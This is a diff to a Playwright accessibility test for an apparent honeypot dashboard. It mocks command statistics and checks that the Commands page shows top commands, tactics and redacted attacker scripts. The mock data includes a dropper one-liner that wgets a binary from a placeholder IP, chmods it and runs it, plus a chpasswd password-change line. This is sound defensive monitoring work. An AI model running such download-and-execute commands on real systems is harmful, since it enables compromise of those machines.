@@ -107,6 +107,26 @@ async function mockApi(page: Page): Promise<void> {
         { username: 'admin', password: 'admin', count: 90, distinct_ips: null },
       ])
     }
+    if (path.endsWith('/stats/commands'))
+      return json({
+        active_sessions: 120,
+        total_commands: 480,
+        unique_commands: 33,
+        top_commands: [
+          { command: 'uname', count: 96 },
+          { command: 'wget', count: 40 },
+          { command: 'chmod', count: 21 },
+        ],
+        tactics: [
+          { name: 'recon', count: 300 },
+          { name: 'download', count: 60 },
+          { name: 'execute', count: 40 },
+        ],
+        top_lines: [
+          { input: 'cd /tmp; wget http://‹ip›/meow; chmod 777 meow; ./meow', count: 7 },
+          { input: "echo 'pw' | chpasswd", count: 3 },
+        ],
+      })
     if (path.endsWith('/stats/auth-outcomes'))
       return json({
         total: 99,
@@ -322,6 +342,27 @@ test.describe('dashboard accessibility smoke', () => {
     await back.click()
     await expect(page).not.toHaveURL(/country=/)
     await expect(page.getByRole('button', { name: /United States/ })).toBeVisible()
+  })
+
+  test('commands page renders top commands, tactics and scripts, axe-clean', async ({ page }) => {
+    await page.goto('/commands')
+    await expect(page.getByRole('heading', { level: 1, name: 'Commands' })).toBeVisible()
+    await expect(page.getByRole('heading', { level: 2, name: 'Top commands' })).toBeVisible()
+    await expect(page.getByRole('heading', { level: 2, name: 'Attack scripts' })).toBeVisible()
+
+    // Executable bucket from top_commands.
+    await expect(page.getByText('uname', { exact: true })).toBeVisible()
+    // Tactic key 'recon' is mapped to the human label 'Recon'.
+    await expect(page.getByText('Recon', { exact: true })).toBeVisible()
+    // A compound dropper one-liner surfaces verbatim with the IP already blotted.
+    await expect(page.getByText(/chmod 777 meow/)).toBeVisible()
+    await expect(page.getByText('34.11.136.102')).toHaveCount(0)
+
+    // The Commands nav tab is lit on its route.
+    await expect(page.getByRole('link', { name: 'Commands', exact: true })).toHaveClass(
+      /nav-link-active/,
+    )
+    await expectAxeClean(page)
   })
 
   test('overview map drills into the countries page', async ({ page }) => {
